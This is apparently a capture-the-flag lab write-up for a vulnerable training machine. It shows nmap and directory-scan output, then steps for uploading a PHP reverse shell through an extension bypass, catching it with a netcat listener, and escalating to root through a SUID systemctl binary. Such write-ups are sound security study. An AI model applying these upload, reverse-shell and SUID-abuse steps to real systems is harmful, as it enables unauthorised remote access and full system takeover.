Got some help from John Hammond for privledge escalation: https://www.youtube.com/watch?v=hvYWCegfEZs

## NMAP
```
└─$ nmap -sV $IP
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-18 20:19 PST
Nmap scan report for <IP>
Host is up (0.15s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.82 seconds
```

## GOBUSTER
```
/images               (Status: 301) [Size: 320] [--> http://<IP>:3333/images/]
/css                  (Status: 301) [Size: 317] [--> http://<IP>:3333/css/]
/js                   (Status: 301) [Size: 316] [--> http://<IP>:3333/js/]
/fonts                (Status: 301) [Size: 319] [--> http://<IP>:3333/fonts/]
/internal             (Status: 301) [Size: 322] [--> http://<IP>:3333/internal/]
```

STEPS TO COMPLETE:

Created fuzzer.py to check for allowed file extension uploads. Found .phtml is allowed

downloaded php reverse shell from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Changed extension on file to .phtml and uploaded it to vulnerable server

use nc to listen on port 4444. `nc -lvnp 4444`

Navigated to http://<IP>:3333/internal/uploads/php-reverse-shell.phtml in web browser.

Gained reverse shell. (unstable)

Find files with suid
find / -perm -4000 2>/dev/null

/bin/systemctl stands out

check gtfobins for systemctl payload

modify payload to add suid to /bin/bash

run `bash -p`

root permissions. cd into /root/ and cat flag file
